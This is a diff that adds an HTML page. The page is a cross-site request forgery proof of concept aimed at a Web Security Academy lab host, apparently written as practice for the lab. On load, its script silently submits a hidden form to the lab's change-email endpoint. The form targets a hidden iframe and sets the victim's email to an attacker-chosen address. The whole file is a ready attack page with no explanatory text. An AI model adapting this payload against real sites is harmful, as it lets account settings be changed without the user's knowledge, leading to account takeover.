@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>HELLO BROTHER</h1>
+    <iframe style="display:none" name="csrf_iframe">
+    <form action="https://0a03000f045b2966802030670063006b.web-security-academy.net/my-account/change-email" id="csrf_form" method="GET" target="csrf_iframe">
+
+        <input type="hidden" name="email" value="victimMe@gmail.com">
+    </form>
+</body>
+<script>
+    document.getElementById('csrf_form').submit();
+</script>
+</html>
